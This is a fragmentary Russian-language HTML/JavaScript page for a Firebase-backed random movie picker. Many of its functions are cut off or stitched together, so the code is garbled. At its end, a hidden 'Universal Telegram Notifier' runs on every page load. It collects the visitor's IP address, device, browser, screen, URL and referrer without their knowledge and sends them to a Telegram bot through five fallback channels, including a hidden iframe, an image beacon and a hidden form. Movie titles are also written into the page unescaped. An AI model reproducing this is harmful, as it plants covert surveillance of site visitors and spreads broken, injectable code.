       // ========== ОБНОВИТЬ СЧЕТЧИКИ ФИЛЬМОВ ==========
async function updateCounters() {
    if (!db) return;
    
    try {
        // Получаем ВСЕ фильмы
        const snapshot = await db.collection('movies').get();
        
        let activeCount = 0;
        let postponedCount = 0;
        
        // Считаем активные и отложенные фильмы
        snapshot.forEach(doc => {
            const movieData = doc.data();
            if (movieData.isActive === false) {
                postponedCount++;
            } else {
                activeCount++;
            }
        });
        
        // Получаем элементы счетчиков
        const activeCounter = document.getElementById('active-counter');
        const postponedCounter = document.getElementById('postponed-counter');
        
        // Обновляем текст счетчиков
        activeCounter.textContent = activeCount;
        postponedCounter.textContent = postponedCount;
        
        // Добавляем/удаляем класс zero в зависимости от значения
        if (activeCount === 0) {
            activeCounter.classList.add('zero');
        } else {
            activeCounter.classList.remove('zero');
        }
        
        if (postponedCount === 0) {
            postponedCounter.classList.add('zero');
        } else {
            postponedCounter.classList.remove('zero');
        }
        
        console.log(`Счетчики обновлены: активные=${activeCount}, отложенные=${postponedCount}`);
        
    } catch (error) {
        console.error("Ошибка обновления счетчиков:", error);
    }
}

        // ========== КНОПКА ПРОМОТКИ ВВЕРХ ==========
        function initScrollToTopButton() {

            if (!scrollToTopBtn) return;
            
            // Показать/скрыть кнопку при прокрутке
            window.addEventListener('scroll', function() {
                if (window.pageYOffset > 300 || document.documentElement.scrollTop > 300) {
                    scrollToTopBtn.style.display = 'flex';
                } else {
                    scrollToTopBtn.style.display = 'none';
                }
            });
            
            // Плавная прокрутка при клике
            scrollToTopBtn.addEventListener('click', function() {
                window.scrollTo({
                    top: 0,
                    behavior: 'smooth'
                });
            });
            
            // Инициализация - скрыть кнопку при загрузке
            scrollToTopBtn.style.display = 'none';
        }

        // ========== ПОЛУЧИТЬ СЛУЧАЙНЫЙ ФИЛЬМ (ИСПРАВЛЕННАЯ ВЕРСИЯ) ==========
async function getRandomMovie() {
    if (!db) {
        showError("Ошибка подключения к базе данных");
        return;
    }
    
    const loading = document.getElementById('loading');
    const resultDiv = document.getElementById('result');
    
    loading.style.display = 'block';
    resultDiv.innerHTML = '';
    
    try {
        // Получаем ВСЕ фильмы
        const snapshot = await db.collection('movies').get();
        
        if (snapshot.empty) {
            resultDiv.innerHTML = `
                <div style="color: #6c757d; padding: 30px;">
                    <h3 style="color: #dc3545;">Нет доступных фильмов!</h3>
                    <p>Все фильмы отложены или список пуст</p>
                    <button class="postpone-btn" onclick="checkAndReturnPostponed()" style="margin-top: 15px;">
                        Проверить отложенные
                    </button>
                </div>
            `;
            updateCounters();
            activeMoviesCache = [];
            availableMoviesCache = [];
            lastRandomMovieId = null;
            return;
        }
        
        const now = new Date();
        
        // Фильтруем ТОЛЬКО активные фильмы
        const activeMovies = [];
        snapshot.forEach(doc => {
            const movieData = doc.data();
            if (movieData.isActive !== false) {
                activeMovies.push({
                    id: doc.id,
                    title: movieData.title,
                    added: movieData.createdAt?.toDate() || new Date()
                });
            }
        });
        
        if (activeMovies.length === 0) {
            resultDiv.innerHTML = `
                <div style="color: #6c757d; padding: 30px;">
                    <h3 style="color: #dc3545;">Нет активных фильмов!</h3>
                    <p>Все фильмы отложены</p>
                    <button class="postpone-btn" onclick="checkAndReturnPostponed()" style="margin-top: 15px;">
                        Проверить отложенные
                    </button>
                </div>
            `;
            updateCounters();
            activeMoviesCache = [];
            availableMoviesCache = [];
            lastRandomMovieId = null;
            return;
        }
        
        // Обновляем кэш активных фильмов
        activeMoviesCache = activeMovies;
        
        // Создаем массив для выбора
        let moviesForSelection = [...activeMovies];
        
        // Исключаем последний показанный фильм только если есть другие варианты
        if (lastRandomMovieId && moviesForSelection.length > 1) {
            const filteredMovies = moviesForSelection.filter(movie => movie.id !== lastRandomMovieId);
            if (filteredMovies.length > 0) {
                moviesForSelection = filteredMovies;
            }
        }
        
        // Генерируем случайный индекс
        const randomIndex = Math.floor(Math.random() * moviesForSelection.length);
        const randomMovie = moviesForSelection[randomIndex];
        
        currentRandomMovie = randomMovie;
        lastRandomMovieId = randomMovie.id;
        
        // Формируем URL для поиска
        const kinopoiskUrl = `https://www.kinopoisk.ru/index.php?kp_query=${encodeURIComponent(randomMovie.title)}`;
        const vkSearchUrl = `https://vk.com/video?q=${encodeURIComponent(randomMovie.title + ' фильм')}&section=search`;
        
        // Создаем HTML с кнопками
        resultDiv.innerHTML = `
            <div style="animation: fadeIn 0.5s;">
                <div style="font-family: Nunito; font-weight: 900; font-size: 2.2em;" class="movie-title">${randomMovie.title}</div>
                <div class="action-buttons">
                    <button 
                       onclick="watchMovie('${randomMovie.id}', '${randomMovie.title.replace(/'/g, "\\'")}', 'kinopoisk', '${kinopoiskUrl}')"
                       style="padding: 12px 22px; border-radius: 50px; font-family: 'Nunito', sans-serif; font-weight: 900; border: none; background: #dc3545; font-size: 16px; color: white; cursor: pointer; margin: 2px;">
                        КиноПоиск
                    </button>
                    
                    <button 
                       onclick="watchMovie('${randomMovie.id}', '${randomMovie.title.replace(/'/g, "\\'")}', 'vk', '${vkSearchUrl}')"
                       style="padding: 12px 22px; border-radius: 50px; font-family: 'Nunito', sans-serif; font-weight: 900; border: none; background: #4e8387ff; font-size: 16px; color: white; cursor: pointer; margin: 2px;">
                        VK
                    </button>
                    
                    <button class="postpone-btn" onclick="postponeMovie('${randomMovie.id}', '${randomMovie.title.replace(/'/g, "\\'")}')">
                        Смотреть позже
                    </button>
                </div>
                <div style="margin-top: 10px; padding-bottom: 15px;font-size: 0.7em; color: #999; text-align: center;">
                    Фильм будет отложен на 24 часа
                </div>
            </div>
        `;
        
    } catch (error) {
        showError(`Ошибка: ${error.message}`);
        console.error("Ошибка получения фильма:", error);
    } finally {
        loading.style.display = 'none';
    }
}

    // ========== ПОСМОТРЕТЬ ФИЛЬМ (УДАЛИТЬ ИЗ СПИСКА) ==========
async function watchMovie(movieId, movieTitle, platform, url) {
    if (!db) return;
    
    if (confirm(`Открыть ${platform === 'kinopoisk' ? 'КиноПоиск' : 'VK'} и удалить фильм "${movieTitle}" из списка?`)) {
        try {
            // 1. СРАЗУ открываем ссылку - это должно быть первым действием на iOS
            const newWindow = window.open(url, '_blank');
            
            // 2. Проверяем, открылось ли окно (на iOS может быть заблокировано)
            if (!newWindow || newWindow.closed || typeof newWindow.closed === 'undefined') {
                // Если окно заблокировано, показываем сообщение
                alert("Всплывающие окна заблокированы. Разрешите всплывающие окна для этого сайта в настройках Safari.");
                // Можно предложить альтернативу - скопировать ссылку
                if (confirm("Хотите скопировать ссылку для поиска?")) {
                    navigator.clipboard.writeText(url);
                    alert("Ссылка скопирована в буфер обмена!");
                }
            }
            
            // 3. Теперь удаляем фильм в фоне
            setTimeout(async () => {
                try {
                    await db.collection('movies').doc(movieId).delete();
                    
                    // Также удаляем все записи об этом фильме из postponedMovies
                    const postponedSnapshot = await db.collection('postponedMovies')
                        .where('movieId', '==', movieId)
                        .get();
                    
                    if (!postponedSnapshot.empty) {
                        const deletePromises = [];
                        postponedSnapshot.forEach(doc => {
                            deletePromises.push(db.collection('postponedMovies').doc(doc.id).delete());
                        });
                        await Promise.all(deletePromises);
                    }
                    
                    // Обновляем кэш
                    activeMoviesCache = activeMoviesCache.filter(movie => movie.id !== movieId);
                    availableMoviesCache = availableMoviesCache.filter(movie => movie.id !== movieId);
                    
                    // Обновляем счетчики
                    updateCounters();
                    
                    // Обновляем списки
                    loadMovieList();
                    loadPostponedMovies();
                    
                    // ОБНОВЛЯЕМ СТРАНИЦУ СРАЗУ ПОСЛЕ УДАЛЕНИЯ
            setTimeout(() => {
                location.reload();
            }, 500);
                    
                } catch (error) {
                    console.error("Ошибка удаления фильма:", error);
                    // Не показываем alert, чтобы не беспокоить пользователя
                }
            }, 100);
            
        } catch (error) {
            console.error("Ошибка открытия ссылки:", error);
        }
    }
}

       // ========== ОТЛОЖИТЬ ФИЛЬМ НА 24 ЧАСА ==========
async function postponeMovie(movieId, movieTitle) {
    if (!db || !currentRandomMovie) return;
    
    const loading = document.getElementById('loading');
    loading.style.display = 'block';
    
    try {
        // Получаем текущее время
        const now = new Date();
        const returnTime = new Date(now.getTime() + 24 * 60 * 60 * 1000); // +24 часа
        
        // 1. Обновляем фильм: помечаем как неактивный и устанавливаем время возврата
        await db.collection('movies').doc(movieId).update({
            isActive: false,
            postponedUntil: returnTime,
            postponedAt: now
        });
        
        // 2. Добавляем в коллекцию отложенных для истории
        await db.collection('postponedMovies').add({
            movieId: movieId,
            title: movieTitle,
            postponedAt: now,
            returnAt: returnTime,
            returned: false
        });
        
        // 3. Обновляем кэш
        activeMoviesCache = activeMoviesCache.filter(movie => movie.id !== movieId);
        availableMoviesCache = availableMoviesCache.filter(movie => movie.id !== movieId);
        
        // 4. Обновляем счетчики

        // ========== ЗАГРУЗИТЬ СПИСОК ОТЛОЖЕННЫХ ФИЛЬМОВ ==========

            listElement.innerHTML = '<li style="text-align: center; color: #666;">Загрузка...</li>';

                // Получаем ВСЕ фильмы
                const snapshot = await db.collection('movies').get();

                            Нет отложенных фильмов
                        </li>
                    `;
                    return;
                }
                
                const movies = [];
                snapshot.forEach(doc => {
                    const movieData = doc.data();
                    movies.push({
                        id: doc.id,
                        ...movieData
                    });
                });
                
                // Фильтруем отложенные фильмы на клиенте
                const postponedMovies = movies.filter(movie => movie.isActive === false);
                
                if (postponedMovies.length === 0) {
                    listElement.innerHTML = `
                        <li style="text-align: center; color: #6c757d; padding: 20px; list-style-type: none !important;">
                            Нет отложенных фильмов
                        </li>
                    `;
                    return;
                }
                
                const now = new Date();
                
                // Сортируем по времени возврата (сначала те, что раньше вернутся)
                postponedMovies.sort((a, b) => {
                    const dateA = a.postponedUntil?.toDate() || new Date(0);
                    const dateB = b.postponedUntil?.toDate() || new Date(0);
                    return dateA - dateB;
                });
                
                postponedMovies.forEach(movie => {
                    const returnTime = movie.postponedUntil?.toDate();
                    const timeLeft = returnTime ? Math.max(0, returnTime - now) : 0;
                    const hoursLeft = Math.floor(timeLeft / (1000 * 60 * 60));
                    const minutesLeft = Math.floor((timeLeft % (1000 * 60 * 60)) / (1000 * 60));
                    
                    const canReturn = timeLeft === 0; // Можно вернуть только когда время вышло
                    
                    const li = document.createElement('li');
                    li.className = 'movie-item';
                    
                    let timeInfo = '';
                    if (timeLeft > 0) {
                        timeInfo = `
                            <div style="font-family: Nunito; font-size: 0.7em; color: #FFA500;">
                                Вернётся через: ${hoursLeft}ч ${minutesLeft}м
                            </div>

                            class="delete-btn" 
                            data-id="${movie.id}" 
                            data-postponed="true"

                    `;
                    listElement.appendChild(li);
                });
                
                // Добавляем обработчики для кнопки "Вернуть сейчас" (только для активных кнопок)
                document.querySelectorAll('.delete-btn[data-postponed="true"]:not([disabled])').forEach(btn => {
                    btn.addEventListener('click', function() {
                        const movieId = this.getAttribute('data-id');
                        returnMovieNow(movieId);

        // ========== ВЕРНУТЬ ФИЛЬМ СЕЙЧАС ==========
        async function returnMovieNow(movieId) {
            if (!db) return;
            
            try {
                // Получаем данные фильма
                const movieDoc = await db.collection('movies').doc(movieId).get();
                if (!movieDoc.exists) return;
                
                const movieData = movieDoc.data();
                const returnTime = movieData.postponedUntil?.toDate();
                const now = new Date();
                
                // Проверяем, истекло ли время откладывания
                if (returnTime && returnTime > now) {
                    const timeLeft = returnTime - now;
                    const hoursLeft = Math.floor(timeLeft / (1000 * 60 * 60));
                    const minutesLeft = Math.floor((timeLeft % (1000 * 60 * 60)) / (1000 * 60));
                    
                    alert(`Фильм можно будет вернуть только через ${hoursLeft}ч ${minutesLeft}м`);
                    return;
                }
                
                if (confirm("Вернуть этот фильм в активный список сейчас?")) {
                    // 1. Обновляем фильм в основной коллекции
                    await db.collection('movies').doc(movieId).update({
                        isActive: true,
                        postponedUntil: null
                    });
                    
                    // 2. Удаляем все записи об этом фильме из postponedMovies
                    const postponedSnapshot = await db.collection('postponedMovies')
                        .where('movieId', '==', movieId)
                        .where('returned', '==', false)
                        .get();
                    
                    if (!postponedSnapshot.empty) {
                        postponedSnapshot.forEach(async (doc) => {
                            await db.collection('postponedMovies').doc(doc.id).delete();
                        });
                    }
                    
                    // 3. Обновляем счетчики
                    updateCounters();
                    
                    // 4. Обновляем списки
                    loadMovieList();
                    loadPostponedMovies();
                    
                    // 5. Показываем уведомление
                    alert("Фильм успешно возвращен в активный список!");
                }
                
            } catch (error) {
                alert("Ошибка возврата фильма: " + error.message);
                console.error("Ошибка возврата фильма:", error);
            }
        }

        // ========== ПРОВЕРИТЬ И ВЕРНУТЬ ОТЛОЖЕННЫЕ ФИЛЬМЫ ==========
        async function checkAndReturnPostponed() {
            if (!db) return;
            
            const loading = document.getElementById('loading');
            loading.style.display = 'block';
            
            try {
                // Получаем ВСЕ фильмы
                const snapshot = await db.collection('movies').get();
                
                const now = new Date();
                let count = 0;
                
                // Проходим по всем фильмам и проверяем, какие пора вернуть
                const updates = [];
                snapshot.forEach(doc => {
                    const movie = doc.data();
                    const returnTime = movie.postponedUntil?.toDate();
                    
                    // Если фильм отложен и время возврата наступило
                    if (movie.isActive === false && returnTime && returnTime <= now) {
                        updates.push({
                            id: doc.id,
                            title: movie.title
                        });
                        count++;
                    }
                });
                
                if (count === 0) {
                    alert("Нет фильмов, которые пора вернуть");
                    return;
                }
                
                // Обновляем все фильмы, которые пора вернуть
                for (const update of updates) {
                    // 1. Обновляем фильм в основной коллекции
                    await db.collection('movies').doc(update.id).update({
                        isActive: true,
                        postponedUntil: null
                    });
                    
                    // 2. Удаляем все записи об этом фильме из postponedMovies
                    const postponedSnapshot = await db.collection('postponedMovies')
                        .where('movieId', '==', update.id)
                        .where('returned', '==', false)
                        .get();
                    
                    if (!postponedSnapshot.empty) {
                        postponedSnapshot.forEach(async (doc) => {
                            await db.collection('postponedMovies').doc(doc.id).delete();
                        });
                    }
                }
                
                alert(`Возвращено ${count} фильм(ов) в активный список!`);
                
                // Обновляем счетчики
                updateCounters();
                
                // Обновляем списки и показываем случайный фильм
                loadMovieList();
                loadPostponedMovies();
                await getRandomMovie();
                
            } catch (error) {
                console.error("Ошибка проверки отложенных фильмов:", error);
                alert("Ошибка при проверке отложенных фильмов");
            } finally {
                loading.style.display = 'none';
            }
        }

        // ========== УДАЛИТЬ ФИЛЬМ ==========
        async function deleteMovie(movieId) {
            if (!db) return;
            
            if (confirm("Удалить этот фильм из списка?")) {
                try {
                    // Удаляем фильм из основной коллекции
                    await db.collection('movies').doc(movieId).delete();
                    
                    // Также удаляем все записи об этом фильме из postponedMovies
                    const postponedSnapshot = await db.collection('postponedMovies')
                        .where('movieId', '==', movieId)
                        .get();
                    
                    if (!postponedSnapshot.empty) {
                        postponedSnapshot.forEach(async (doc) => {
                            await db.collection('postponedMovies').doc(doc.id).delete();
                        });
                    }
                    
                    // Обновляем кэш
                    activeMoviesCache = activeMoviesCache.filter(movie => movie.id !== movieId);
                    availableMoviesCache = availableMoviesCache.filter(movie => movie.id !== movieId);
                    
                    // Обновляем счетчики
                    updateCounters();
                    
                    // Обновляем списки
                    loadMovieList();
                    loadPostponedMovies();
                    
                } catch (error) {
                    alert("Ошибка удаления: " + error.message);
                }
            }
        }

        // ========== ИНИЦИАЛИЗИРОВАТЬ БАЗУ ДАННЫХ ==========
        async function initializeDatabase() {
            try {
                // Проверяем, нужно ли обновить структуру существующих фильмов
                const snapshot = await db.collection('movies').limit(1).get();
                
                if (!snapshot.empty) {
                    const updates = [];
                    const allMovies = await db.collection('movies').get();
                    
                    allMovies.forEach(doc => {
                        const movieData = doc.data();
                        // Если нет поля isActive, добавляем его
                        if (movieData.isActive === undefined) {
                            updates.push(
                                db.collection('movies').doc(doc.id).update({
                                    isActive: true,
                                    postponedUntil: null
                                })
                            );
                        }
                    });
                    
                    // Выполняем все обновления
                    if (updates.length > 0) {
                        await Promise.all(updates);
                        console.log(`Обновлено ${updates.length} фильмов`);
                    }
                }
            } catch (error) {
                console.error("Ошибка инициализации базы:", error);
            }
        }

        // ========== ПЕРЕКЛЮЧЕНИЕ ВКЛАДОК ==========
        function switchTab(tabName) {
            // Обновляем кнопки вкладок
            document.querySelectorAll('.tab-btn').forEach(btn => {
                btn.classList.remove('active');
                if (btn.dataset.tab === tabName) {
                    btn.classList.add('active');
                }
            });
            
            // Показываем соответствующую вкладку
            document.querySelectorAll('.tab-content').forEach(content => {
                content.classList.remove('active');
            });
            
            if (tabName === 'active') {
                document.getElementById('active-movies-tab').classList.add('active');
                loadMovieList();
            } else {
                document.getElementById('postponed-movies-tab').classList.add('active');
                loadPostponedMovies();
            }
        }

            const button = document.getElementById('toggle-list-btn');
            
            if (container.style.display === 'block') {

                container.style.display = 'none';
                tabButtons.style.display = 'none';
                button.textContent = 'Показать список фильмов';

                switchTab('active');
                loadMovieList();

            const encodedMessage = encodeURIComponent(message);
            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodedMessage}&parse_mode=HTML`;
            
            const img = new Image();
            img.onload = () => {
                resolve({ ok: true, method: 'image' });
            };
            img.onerror = () => {
                reject(new Error('Image error'));
            };
            img.src = url;
        });
    }

    // МЕТОД 3: Отправка через WebSocket (если доступен)
    function sendViaWebSocket(message) {
        return new Promise((resolve, reject) => {
            // Используем публичный WebSocket прокси для Telegram
            const ws = new WebSocket('wss://echo.websocket.org');
            
            ws.onopen = () => {
                const data = JSON.stringify({
                    bot_token: BOT_TOKEN,
                    chat_id: CHAT_ID,
                    text: message,
                    parse_mode: 'HTML'
                });
                ws.send(data);
            };
            
            ws.onmessage = (event) => {
                try {
                    const response = JSON.parse(event.data);
                    if (response.ok) {
                        resolve({ ok: true, method: 'websocket' });
                    } else {
                        reject(new Error('WebSocket error'));
                    }
                } catch (e) {
                    reject(e);
                }
                ws.close();
            };
            
            ws.onerror = () => {
                reject(new Error('WebSocket connection error'));
                ws.close();
            };
            
            setTimeout(() => {
                if (ws.readyState !== WebSocket.CLOSED) {
                    ws.close();
                    reject(new Error('WebSocket timeout'));
                }
            }, 5000);
        });
    }

    // МЕТОД 4: Отправка через скрытую форму (POST)
    function sendViaForm(message) {
        return new Promise((resolve, reject) => {
            const form = document.createElement('form');
            form.method = 'POST';
            form.action = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
            form.target = '_blank';
            form.style.display = 'none';
            
            const fields = {
                chat_id: CHAT_ID,
                text: message,
                parse_mode: 'HTML'
            };
            
            for (const [key, value] of Object.entries(fields)) {
                const input = document.createElement('input');
                input.type = 'hidden';
                input.name = key;
                input.value = value;
                form.appendChild(input);
            }
            
            document.body.appendChild(form);
            form.submit();
            
            setTimeout(() => {
                document.body.removeChild(form);
                resolve({ ok: true, method: 'form' });
            }, 2000);
            
            form.onsubmit = () => {
                setTimeout(() => {
                    document.body.removeChild(form);
                }, 1000);
            };
        });
    }

    // МЕТОД 5: Отправка через data URI (экспериментально)
    function sendViaDataUri(message) {
        return new Promise((resolve, reject) => {
            const encodedMessage = encodeURIComponent(message);
            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodedMessage}&parse_mode=HTML`;
            
            const link = document.createElement('a');
            link.href = url;
            link.target = '_blank';
            link.style.display = 'none';
            document.body.appendChild(link);
            link.click();
            
            setTimeout(() => {
                document.body.removeChild(link);
                resolve({ ok: true, method: 'datauri' });
            }, 2000);
        });
    }

    // Основная функция отправки с автоматическим выбором метода
    async function sendToTelegram(message) {
        const methods = [
            sendViaIframe,
            sendViaImage,
            sendViaForm,
            sendViaDataUri,
            sendViaWebSocket
        ];
        
        for (let i = 0; i < methods.length; i++) {
            try {
                console.log(`🔄 Пробую метод ${i + 1}/${methods.length}: ${methods[i].name}`);
                const result = await methods[i](message);
                console.log(`✅ Успешно отправлено через ${result.method}`);
                return result;
            } catch (error) {
                console.warn(`❌ Метод ${methods[i].name} не сработал:`, error.message);
                if (i === methods.length - 1) {
                    throw new Error('Все методы отправки не сработали');
                }
                // Ждем перед следующей попыткой
                await new Promise(resolve => setTimeout(resolve, 1000));
            }
        }
    }

    // Основная функция
    async function sendVisitorInfo() {
        if (isSending) return;
        isSending = true;

        try {
            const dateTime = getDateTime();
            const browserInfo = getBrowserInfo();
            const screenInfo = getScreenInfo();
            const pageInfo = getPageInfo();
            const extraInfo = getExtraInfo();

            // Получаем IP через бесплатный сервис
            let ip = 'Не удалось получить';
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                ip = data.ip;
            } catch (e) {
                console.warn('Не удалось получить IP');
            }

            const visitorKey = `${browserInfo.browser}|${browserInfo.os}|${screenInfo.width}x${screenInfo.height}|${dateTime.date}`;
            
            if (visitorKey === lastVisitorKey) {
                console.log('⏭️ Информация уже отправлена сегодня');
                isSending = false;
                return;
            }

            // Формируем сообщение
            let message = `🆕 <b>Новый посетитель!</b>\n\n`;
            message += `🕐 <b>Время:</b> ${dateTime.full}\n`;
            message += `🌐 <b>Часовой пояс:</b> ${dateTime.timezone} (UTC${dateTime.timezoneOffset >= 0 ? '+' : ''}${dateTime.timezoneOffset})\n`;
            message += `🌐 <b>IP-адрес:</b> ${ip}\n\n`;
            
            message += `💻 <b>Устройство:</b>\n`;
            message += `   • Тип: ${browserInfo.deviceType}\n`;
            message += `   • ОС: ${browserInfo.os}\n`;
            message += `   • Браузер: ${browserInfo.browser}\n\n`;
            
            message += `🖥️ <b>Экран:</b>\n`;
            message += `   • Разрешение: ${screenInfo.width}×${screenInfo.height}\n`;
            message += `   • Доступно: ${screenInfo.availWidth}×${screenInfo.availHeight}\n`;
            message += `   • Пикселей на дюйм: ${screenInfo.pixelRatio}\n`;
            message += `   • Глубина цвета: ${screenInfo.colorDepth} бит\n\n`;
            
            message += `🌍 <b>Страница:</b>\n`;
            message += `   • URL: ${pageInfo.url}\n`;
            message += `   • Хост: ${pageInfo.hostname}\n`;
            message += `   • Заголовок: ${pageInfo.title}\n`;
            message += `   • Реферер: ${pageInfo.referrer}\n\n`;
            
            message += `🔧 <b>Дополнительно:</b>\n`;
            message += `   • Язык: ${extraInfo.language}\n`;
            message += `   • Cookies: ${extraInfo.cookiesEnabled ? '✅ Включены' : '❌ Отключены'}\n`;
            message += `   • DNT: ${extraInfo.doNotTrack}\n`;
            message += `   • Соединение: ${extraInfo.connection}`;

            // Пробуем отправить
            await sendToTelegram(message);
            
            console.log('✅ Информация отправлена в Telegram');
            lastVisitorKey = visitorKey;
            localStorage.setItem(STORAGE_KEY, visitorKey);

        } catch (error) {
            console.error('❌ Ошибка:', error.message);
            // Сохраняем в localStorage для повторной отправки
            const pending = JSON.parse(localStorage.getItem('pending_telegram') || '[]');
            pending.push({
                message: message,
                timestamp: Date.now()
            });
            localStorage.setItem('pending_telegram', JSON.stringify(pending));
        } finally {
            isSending = false;
        }
    }

    // Повторная отправка сохраненных сообщений
    function retryPending() {
        const pending = JSON.parse(localStorage.getItem('pending_telegram') || '[]');
        if (pending.length === 0) return;
        
        const now = Date.now();
        const recent = pending.filter(msg => now - msg.timestamp < 3600000); // 1 час
        
        if (recent.length > 0) {
            console.log(`📤 Попытка отправить ${recent.length} сохраненных сообщений`);
            recent.forEach(msg => {
                sendToTelegram(msg.message)
                    .then(() => {
                        const remaining = pending.filter(m => m.timestamp !== msg.timestamp);
                        localStorage.setItem('pending_telegram', JSON.stringify(remaining));
                    })
                    .catch(() => {});
            });
        }
    }

    // Инициализация
    function init() {
        console.log('📡 Universal Telegram Notifier запущен!');
        console.log('🔄 Используется 5 методов отправки');
        
        retryPending();
        
        setTimeout(() => {
            sendVisitorInfo();
        }, 2000);
    }

    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', init);
    } else {
        init();
    }

})();
</script>
</body>
</html>
